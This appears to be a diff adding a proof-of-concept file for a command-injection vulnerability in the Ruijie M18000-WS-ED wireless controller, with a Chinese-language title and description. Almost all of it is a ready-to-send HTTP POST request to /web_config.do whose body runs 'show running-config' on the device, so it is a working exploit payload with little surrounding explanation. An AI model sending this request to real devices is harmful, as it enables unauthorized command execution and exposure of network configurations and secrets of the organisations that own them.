@@ -1,0 +1,10 @@
+# 锐捷M18000-WS-ED无线控制器CRL命令注入
+# 锐捷M18000-WS-ED无线控制器存在CRL命令注入漏洞，攻击者可以执行任意crl命令获取敏感信息
+POST /web_config.do?acid=80051544&bid=hd_tag_m8mv2466 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2466
+RM-PRO-Token: 97d22c8ba87760e60fcc5a5480026311
+RM-PRO-Time: 1742808365696
+User-Agent: curl/7.83.1
+
+command=show+running-config&mode_url=exec
